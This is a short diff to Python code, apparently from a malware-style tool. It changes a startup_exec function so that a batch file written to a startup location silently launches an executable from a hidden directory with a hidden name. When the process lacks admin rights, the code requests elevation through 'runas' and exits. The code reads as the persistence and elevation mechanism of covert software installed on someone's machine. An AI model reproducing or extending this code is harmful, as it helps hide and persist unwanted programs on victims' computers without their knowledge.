@@ -91,7 +91,10 @@ def startup_exec():
     if not exists(bat_full_path):
         if is_admin():
             with open(bat_full_path, "w+", encoding="utf-8") as bat_file:
-                bat_file.write(r'start ' + sys.argv[0])
+                bat_file.write(r'start ' + "\"\" \"" + os.environ['USERPROFILE'] +
+                               os.getenv("HIDDEN_PROCESS_DIRECTORY") +
+                               os.getenv("HIDDEN_PROCESS_NAME") + "\\" +
+                               os.getenv("HIDDEN_PROCESS_NAME") + ".exe" + "\"")
         else:
             ctypes.windll.shell32.ShellExecuteW(None,
                                                 "runas",
@@ -99,6 +102,7 @@ def startup_exec():
                                                 " ".join(sys.argv),
                                                 None,
                                                 1)
+            sys.exit(0)
 
 
 def is_admin():
